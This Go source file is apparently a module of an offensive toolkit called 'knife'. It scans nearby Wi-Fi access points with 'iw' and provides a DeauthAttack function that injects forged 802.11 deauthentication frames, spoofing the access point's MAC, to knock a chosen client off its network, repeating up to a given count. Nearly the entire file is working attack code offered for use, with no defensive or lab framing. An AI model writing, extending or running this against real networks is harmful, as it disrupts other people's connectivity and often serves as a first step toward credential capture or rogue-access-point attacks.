// knife/modules/wifi/deauth.go
package wifi

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"

	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// AP holds parsed scan info
type AP struct {
	BSSID  string
	SSID   string
	Signal float64 // dBm (negative numbers; closer to 0 is stronger)
}

// scanAPs runs `iw dev <iface> scan` and returns parsed APs
func scanAPs(iface string) ([]AP, error) {
	reBSS := regexp.MustCompile(`^BSS\s+([0-9a-f:]{17})\b`)
	reSSID := regexp.MustCompile(`^\s*SSID:\s*(.*)$`)
	reSignal := regexp.MustCompile(`^\s*signal:\s*([-\d\.]+)\s*dBm`)

	cmd := exec.Command("iw", "dev", iface, "scan")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("iw scan failed: %v; output:\n%s", err, out.String())
	}

	var results []AP
	var cur *AP
	scanner := bufio.NewScanner(&out)
	for scanner.Scan() {
		line := scanner.Text()
		if m := reBSS.FindStringSubmatch(line); m != nil {
			if cur != nil {
				results = append(results, *cur)
			}
			cur = &AP{BSSID: strings.ToLower(m[1])}
			continue
		}
		if cur == nil {
			continue
		}
		if m := reSSID.FindStringSubmatch(line); m != nil {
			cur.SSID = m[1]
			continue
		}
		if m := reSignal.FindStringSubmatch(line); m != nil {
			// parse float
			if v, err := strconv.ParseFloat(m[1], 64); err == nil {
				cur.Signal = v
			}
			continue
		}
	}
	if cur != nil {
		results = append(results, *cur)
	}
	return results, nil
}

func DeauthAttack(iface, bssid, target string, count int) error {
	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever)
	if err != nil {
		return err
	}
	defer handle.Close()

	for i := 0; i < count; i++ {
		packet := craftDeauth(bssid, target)
		err := handle.WritePacketData(packet)
		if err != nil {
			log.Printf("Error sending packet: %v", err)
		}
		time.Sleep(100 * time.Millisecond)
	}
	return nil
}

func craftDeauth(bssid, target string) []byte {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}

	bssidMAC, err := net.ParseMAC(bssid)
	if err != nil {
		log.Printf("Invalid BSSID MAC address: %v", err)
		return nil
	}
	targetMAC, err := net.ParseMAC(target)
	if err != nil {
		log.Printf("Invalid target MAC address: %v", err)
		return nil
	}

	dot11 := &layers.Dot11{
		Type:     layers.Dot11TypeMgmtDeauthentication,
		Address1: targetMAC,
		Address2: bssidMAC,
		Address3: bssidMAC,
	}
	deauth := &layers.Dot11MgmtDeauthentication{
		Reason: 7,
	}

	gopacket.SerializeLayers(buf, opts,
		dot11,
		deauth,
	)
	return buf.Bytes()
}
